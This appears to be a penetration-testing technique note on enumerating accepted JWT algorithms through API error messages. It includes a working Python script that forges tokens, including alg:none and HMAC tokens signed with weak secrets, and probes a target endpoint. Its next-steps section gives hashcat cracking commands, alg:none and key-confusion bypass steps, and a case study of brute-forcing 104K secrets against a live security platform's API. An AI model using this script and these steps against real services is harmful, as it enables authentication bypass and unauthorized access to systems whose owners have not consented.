# JWT Algorithm Enumeration via Error Messages

## Overview

When an API uses JWT authentication, error messages from invalid tokens reveal the accepted algorithm. Three distinct error classes identify what the server supports:

| Error Message | Meaning | Action |
|---------------|---------|--------|
| "Signature verification failed" | **Algorithm ACCEPTED** — server tried to verify | Target for brute-force |
| "Algorithm not allowed" | Algorithm recognized but policy-blocked | Server knows it, won't use it |
| "Algorithm not supported" | Library doesn't implement this | Not available at all |
| "Wrong number of segments" | Token format invalid (not 3 parts) | Fix token structure |

## Procedure

```python
import base64, json, hmac, hashlib, time
import httpx

def make_jwt(alg, secret='secret'):
    header = base64.urlsafe_b64encode(
        json.dumps({'alg': alg, 'typ': 'JWT'}, separators=(',',':')).encode()
    ).rstrip(b'=').decode()
    payload = base64.urlsafe_b64encode(
        json.dumps({'sub': '1', 'name': 'admin', 'iat': int(time.time()),
                    'exp': int(time.time()) + 3600}, separators=(',',':')).encode()
    ).rstrip(b'=').decode()
    
    if alg == 'none':
        return f'{header}.{payload}.'
    elif alg.startswith('HS'):
        msg = f'{header}.{payload}'.encode()
        hash_fn = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}[alg]
        sig = hmac.new(secret.encode(), msg, hash_fn).digest()
        return f'{header}.{payload}.{base64.urlsafe_b64encode(sig).rstrip(b"=").decode()}'
    else:
        return f'{header}.{payload}.invalidsignature'

algorithms = ['none', 'HS256', 'HS384', 'HS512', 'RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512']

for alg in algorithms:
    token = make_jwt(alg)
    r = httpx.get(TARGET_URL, headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=5)
    print(f'{alg}: {r.status_code} | {r.text[:60]}')
```

## Interpretation & Next Steps

1. **If HS256/384/512 accepted** → brute-force the HMAC secret:
   - Use SecLists: `/Passwords/scraped-JWT-secrets.txt` (104K entries)
   - Tool: `hashcat -a 0 -m 16500 "$JWT" wordlist.txt`
   - Or Python: generate valid signatures with candidate secrets and test against API

2. **If RS256 accepted** → look for:
   - Public key exposure (/.well-known/jwks.json, /oauth/certs)
   - Key confusion attack (sign with public key as HMAC secret)
   - Weak key (< 2048 bits)

3. **If alg:none accepted** → immediate auth bypass (CVE-2015-9235)

4. **If only one HMAC algorithm accepted** (e.g., HS512 but not HS256/384):
   - Server has explicit algorithm whitelist (more secure)
   - Brute-force must target the specific algorithm
   - Secret is likely strong if common wordlists fail

## Lucy Security Platform Case Study (2026-05)

- API endpoints: `/api/version`, `/api/campaigns`, `/api/domains`
- Error for no token: `{"error":"No token header."}`
- Error for non-JWT: `{"error":"Wrong number of segments"}`
- **HS512 accepted** (Signature verification failed)
- HS256/HS384/RS256 blocked (Algorithm not allowed)
- alg:none/RS384/RS512/ES256 not supported
- 104K JWT secrets tested — none worked (strong custom secret)
- Server rate-limits requests (brute-force is slow over network)

## Offline vs Online Brute-Force

- **Online** (testing against live API): ~1-5 req/sec due to rate limiting. Only viable for small wordlists.
- **Offline** (if you have a valid token to crack): Use hashcat/john. Millions of attempts per second. Always prefer offline if you can capture a valid JWT from traffic, logs, or source code.

## Tips

- Check source code (JS bundles, Flutter main.dart.js) for hardcoded JWTs — even expired ones reveal the algorithm and can be cracked offline
- Lucy/GoPhish platforms often use HS512 with custom secrets
- The API error messages themselves are an information disclosure finding (reveals auth mechanism)
